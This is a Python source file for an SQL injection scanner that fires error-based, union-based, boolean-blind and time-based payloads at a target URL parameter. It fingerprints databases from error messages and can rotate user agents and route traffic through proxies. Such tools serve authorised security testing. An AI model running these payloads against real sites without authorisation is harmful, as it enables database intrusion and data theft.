"""
Script: advanced_sqli_scanner.py
Author: Zachary Hickman
Description: Concurrent SQL injection scanning tool with payload fuzzing, response
             analysis, and heuristic-based detection for multiple injection vectors.
             Includes database fingerprinting and confidence scoring.
License: GPL-3.0
"""

import requests
import sys
import re
import time
import random
import argparse
import logging
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict, Tuple, Optional
from dataclasses import dataclass
from datetime import datetime
import concurrent.futures
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Configuration and data classes
@dataclass
class ScanConfig:
    """Configuration for SQL injection scanning"""
    timeout: int = 10
    delay: float = 1.0
    max_retries: int = 3
    user_agents: List[str] = None
    proxies: List[str] = None
    threads: int = 5
    verbose: bool = False
    output_file: Optional[str] = None
    
    def __post_init__(self):
        if self.user_agents is None:
            self.user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101'
            ]

@dataclass
class ScanResult:
    """Result of a SQL injection scan"""
    url: str
    payload: str
    injection_type: str
    database_type: Optional[str] = None
    confidence: float = 0.0
    response_time: float = 0.0
    status_code: int = 0
    error_message: Optional[str] = None
    timestamp: str = None
    
    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now().isoformat()

# Comprehensive payload database organized by injection type
payloads = {
    'error_based': [
        "'",
        "\"",
        "';",
        "\";",
        "' OR 1=1 -- ",
        "\" OR 1=1 -- ",
        "' OR 1=1 #",
        "\" OR 1=1 #",
        "admin' --",
        "admin' #",
        "1' OR '1'='1",
        "1\" OR \"1\"=\"1",
        "' UNION SELECT NULL -- ",
        "\" UNION SELECT NULL -- ",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
        "\" AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
        "'; WAITFOR DELAY '00:00:05' -- ",
        "\"; WAITFOR DELAY '00:00:05' -- ",
        "' OR pg_sleep(5) -- ",
        "\" OR pg_sleep(5) -- ",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
        "1\" AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- "
    ],
    'union_based': [
        "' UNION SELECT NULL -- ",
        "\" UNION SELECT NULL -- ",
        "' UNION SELECT NULL,NULL -- ",
        "\" UNION SELECT NULL,NULL -- ",
        "' UNION SELECT NULL,NULL,NULL -- ",
        "\" UNION SELECT NULL,NULL,NULL -- ",
        "' UNION SELECT 1,2,3 -- ",
        "\" UNION SELECT 1,2,3 -- ",
        "' UNION SELECT user(),database(),version() -- ",
        "\" UNION SELECT user(),database(),version() -- ",
        "' UNION SELECT table_name,column_name FROM information_schema.columns -- ",
        "\" UNION SELECT table_name,column_name FROM information_schema.columns -- "
    ],
    'boolean_blind': [
        "' AND 1=1 -- ",
        "' AND 1=2 -- ",
        "\" AND 1=1 -- ",
        "\" AND 1=2 -- ",
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 -- ",
        "' AND (SELECT COUNT(*) FROM information_schema.tables)=0 -- ",
        "\" AND (SELECT COUNT(*) FROM information_schema.tables)>0 -- ",
        "\" AND (SELECT COUNT(*) FROM information_schema.tables)=0 -- "
    ],
    'time_based': [
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
        "\" AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
        "'; WAITFOR DELAY '00:00:05' -- ",
        "\"; WAITFOR DELAY '00:00:05' -- ",
        "' OR pg_sleep(5) -- ",
        "\" OR pg_sleep(5) -- ",
        "' AND IF(1=1,SLEEP(5),0) -- ",
        "\" AND IF(1=1,SLEEP(5),0) -- "
    ]
}

# Enhanced error patterns with confidence scoring
enhanced_db_errors = {
    'MySQL': [
        (r"SQL syntax.*MySQL", 0.9),
        (r"Warning: mysql_fetch_array\(\)", 0.8),
        (r"You have an error in your SQL syntax", 0.9),
        (r"MySQL server version for the right syntax", 0.8),
        (r"mysql_num_rows\(\)", 0.7),
        (r"mysql_fetch_assoc\(\)", 0.7)
    ],
    'PostgreSQL': [
        (r"PostgreSQL.*ERROR", 0.9),
        (r"ERROR: syntax error", 0.8),
        (r"pg_query\(\)", 0.7),
        (r"pg_exec\(\)", 0.7),
        (r"Warning: pg_", 0.6)
    ],
    'Oracle': [
        (r"ORA-00933: SQL command not properly ended", 0.9),
        (r"ORA-01756: quoted string not properly terminated", 0.8),
        (r"Oracle error", 0.7),
        (r"Oracle.*ORA-", 0.8)
    ],
    'SQL Server': [
        (r"Unclosed quotation mark", 0.9),
        (r"Microsoft OLE DB Provider for ODBC Drivers error", 0.8),
        (r"Microsoft.*ODBC.*SQL Server", 0.7),
        (r"SQLServer JDBC Driver", 0.7),
        (r"System.Data.SqlClient.SqlException", 0.8)
    ],
    'SQLite': [
        (r"sqlite_query\(\)", 0.8),
        (r"SQLite error", 0.7),
        (r"SQLite3::SQLException", 0.8),
        (r"database disk image is malformed", 0.6)
    ]
}

# Setup logging
def setup_logging(verbose: bool = False, log_file: Optional[str] = None):
    """Setup logging configuration"""
    level = logging.DEBUG if verbose else logging.INFO
    format_str = '%(asctime)s - %(levelname)s - %(message)s'
    
    handlers = [logging.StreamHandler()]
    if log_file:
        handlers.append(logging.FileHandler(log_file))
    
    logging.basicConfig(
        level=level,
        format=format_str,
        handlers=handlers
    )
    return logging.getLogger(__name__)

# Input validation
def validate_url(url: str) -> bool:
    """Validate if the URL is properly formatted"""
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except Exception:
        return False

def create_session(config: ScanConfig) -> requests.Session:
    """Create a configured requests session with retry strategy"""
    session = requests.Session()
    
    # Setup retry strategy
    retry_strategy = Retry(
        total=config.max_retries,
        backoff_factor=1,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    # Set default headers
    session.headers.update({
        'User-Agent': random.choice(config.user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    })
    
    # Configure proxy if provided
    if config.proxies:
        session.proxies = {
            'http': config.proxies[0],
            'https': config.proxies[0]
        }
    
    return session

def test_payload(session: requests.Session, url: str, payload: str, 
                injection_type: str, config: ScanConfig, logger: logging.Logger) -> Optional[ScanResult]:
    """Test a single payload against the target URL"""
    try:
        test_url = f"{url}{payload}"
        logger.debug(f"Testing payload: {payload}")
        
        start_time = time.time()
        response = session.get(test_url, timeout=config.timeout)
        response_time = time.time() - start_time
        
        # Check for error-based SQL injection
        for db_type, patterns in enhanced_db_errors.items():
            for pattern, confidence in patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    logger.warning(f"Error-based SQLi detected: {db_type} (confidence: {confidence})")
                    return ScanResult(
                        url=test_url,
                        payload=payload,
                        injection_type=injection_type,
                        database_type=db_type,
                        confidence=confidence,
                        response_time=response_time,
                        status_code=response.status_code
                    )
        
        # Time-based blind SQL injection detection
        if injection_type == 'time_based' and response_time > 4.0:
            logger.warning(f"Time-based SQLi detected (response time: {response_time:.2f}s)")
            return ScanResult(
                url=test_url,
                payload=payload,
                injection_type=injection_type,
                confidence=0.7,
                response_time=response_time,
                status_code=response.status_code
            )
        
        return None
        
    except requests.exceptions.RequestException as e:
        logger.error(f"Request failed for {test_url}: {e}")
        return ScanResult(
            url=test_url,
            payload=payload,
            injection_type=injection_type,
            error_message=str(e),
            status_code=0
        )
    except Exception as e:
        logger.error(f"Unexpected error testing {test_url}: {e}")
        return None

def test_boolean_blind(session: requests.Session, url: str, config: ScanConfig, 
                      logger: logging.Logger) -> Optional[ScanResult]:
    """Test for boolean-based blind SQL injection"""
    try:
        # Test with true condition
        true_payload = "1' AND '1'='1' -- "
        true_url = f"{url}{true_payload}"
        
        # Test with false condition  
        false_payload = "1' AND '1'='2' -- "
        false_url = f"{url}{false_payload}"
        
        logger.debug("Testing boolean-based blind SQLi")
        
        true_response = session.get(true_url, timeout=config.timeout)
        false_response = session.get(false_url, timeout=config.timeout)
        
        # Compare response lengths and content
        true_length = len(true_response.text)
        false_length = len(false_response.text)
        
        # Significant difference in response length might indicate blind SQLi
        if abs(true_length - false_length) > 100:
            logger.warning(f"Boolean-based blind SQLi detected (length diff: {abs(true_length - false_length)})")
            return ScanResult(
                url=true_url,
                payload=true_payload,
                injection_type='boolean_blind',
                confidence=0.6,
                response_time=0.0,
                status_code=true_response.status_code
            )
        
        return None
        
    except Exception as e:
        logger.error(f"Error testing boolean-based blind SQLi: {e}")
        return None

def scan_for_sqli(url: str, config: ScanConfig = None) -> List[ScanResult]:
    """Enhanced SQL injection scanner with comprehensive testing"""
    if config is None:
        config = ScanConfig()
    
    logger = setup_logging(config.verbose)
    results = []
    
    # Validate input URL
    if not validate_url(url):
        logger.error(f"Invalid URL format: {url}")
        return results
    
    logger.info(f"Starting SQL injection scan for: {url}")
    
    # Create session with retry strategy
    session = create_session(config)
    
    # Test all payload types
    for injection_type, payload_list in payloads.items():
        logger.info(f"Testing {injection_type} payloads...")
        
        # Use thread pool for concurrent testing
        with concurrent.futures.ThreadPoolExecutor(max_workers=config.threads) as executor:
            futures = []
            
            for payload in payload_list:
                future = executor.submit(test_payload, session, url, payload, 
                                       injection_type, config, logger)
                futures.append(future)
                
                # Rate limiting
                time.sleep(config.delay)
            
            # Collect results
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result and result.confidence > 0:
                    results.append(result)
    
    # Test boolean-based blind SQLi separately
    logger.info("Testing boolean-based blind SQLi...")
    blind_result = test_boolean_blind(session, url, config, logger)
    if blind_result:
        results.append(blind_result)
    
    # Close session
    session.close()
    
    logger.info(f"Scan completed. Found {len(results)} potential vulnerabilities.")
    return results

def generate_report(results: List[ScanResult], output_file: Optional[str] = None) -> str:
    """Generate a detailed report of scan results"""
    report = []
    report.append("=" * 80)
    report.append("SQL INJECTION SCAN REPORT")
    report.append("=" * 80)
    report.append(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    report.append(f"Total Vulnerabilities Found: {len(results)}")
    report.append("")
    
    if not results:
        report.append("No SQL injection vulnerabilities detected.")
    else:
        for i, result in enumerate(results, 1):
            report.append(f"Vulnerability #{i}")
            report.append("-" * 40)
            report.append(f"URL: {result.url}")
            report.append(f"Payload: {result.payload}")
            report.append(f"Injection Type: {result.injection_type}")
            if result.database_type:
                report.append(f"Database: {result.database_type}")
            report.append(f"Confidence: {result.confidence:.2f}")
            report.append(f"Response Time: {result.response_time:.2f}s")
            report.append(f"Status Code: {result.status_code}")
            if result.error_message:
                report.append(f"Error: {result.error_message}")
            report.append("")
    
    report_text = "\n".join(report)
    
    if output_file:
        try:
            with open(output_file, 'w') as f:
                f.write(report_text)
            print(f"Report saved to: {output_file}")
        except Exception as e:
            print(f"Error saving report: {e}")
    
    return report_text

def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="Enhanced SQL Injection Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # These examples demonstrate different usage scenarios. Replace 'http://example.com/page.php?id='
  # with your actual target URL. The URL should end with a parameter (e.g., ?id= or ?user=)
  # where SQL injection payloads will be appended for testing.
  
  python SQL_Scanner.py http://example.com/page.php?id=
  python SQL_Scanner.py -u http://example.com/page.php?id= -v -o report.txt
  python SQL_Scanner.py -u http://example.com/page.php?id= -t 10 -d 0.5
  python SQL_Scanner.py -u http://example.com/page.php?id= --proxy http://127.0.0.1:8080
        """
    )
    
    parser.add_argument('-u', '--url', required=True,
                       help='Target URL with parameter (e.g., http://example.com/page.php?id=)')
    parser.add_argument('-t', '--timeout', type=int, default=10,
                       help='Request timeout in seconds (default: 10)')
    parser.add_argument('-d', '--delay', type=float, default=1.0,
                       help='Delay between requests in seconds (default: 1.0)')
    parser.add_argument('-r', '--retries', type=int, default=3,
                       help='Number of retries for failed requests (default: 3)')
    parser.add_argument('--threads', type=int, default=5,
                       help='Number of concurrent threads (default: 5)')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Enable verbose logging')
    parser.add_argument('-o', '--output', type=str,
                       help='Output file for scan report')
    parser.add_argument('--proxy', type=str,
                       help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--log-file', type=str,
                       help='Log file path')
    
    return parser.parse_args()

def main():
    """Main function"""
    try:
        args = parse_arguments()
        
        # Create configuration
        config = ScanConfig(
            timeout=args.timeout,
            delay=args.delay,
            max_retries=args.retries,
            threads=args.threads,
            verbose=args.verbose,
            output_file=args.output
        )
        
        # Add proxy if specified
        if args.proxy:
            config.proxies = [args.proxy]
        
        # Setup logging
        logger = setup_logging(args.verbose, args.log_file)
        
        # Validate URL
        if not validate_url(args.url):
            logger.error(f"Invalid URL format: {args.url}")
            print("Error: Invalid URL format. Please provide a valid URL with http:// or https://")
            sys.exit(1)
        
        # Run scan
        print(f"Starting SQL injection scan for: {args.url}")
        print(f"Configuration: timeout={config.timeout}s, delay={config.delay}s, threads={config.threads}")
        print("-" * 60)
        
        results = scan_for_sqli(args.url, config)
        
        # Generate and display report
        report = generate_report(results, args.output)
        print("\n" + report)
        
        # Exit with appropriate code
        if results:
            print(f"\n[!] Found {len(results)} potential SQL injection vulnerabilities!")
            sys.exit(1)  # Exit with error code if vulnerabilities found
        else:
            print("\n[+] No SQL injection vulnerabilities detected.")
            sys.exit(0)
            
    except KeyboardInterrupt:
        print("\n\nScan interrupted by user.")
        sys.exit(130)
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
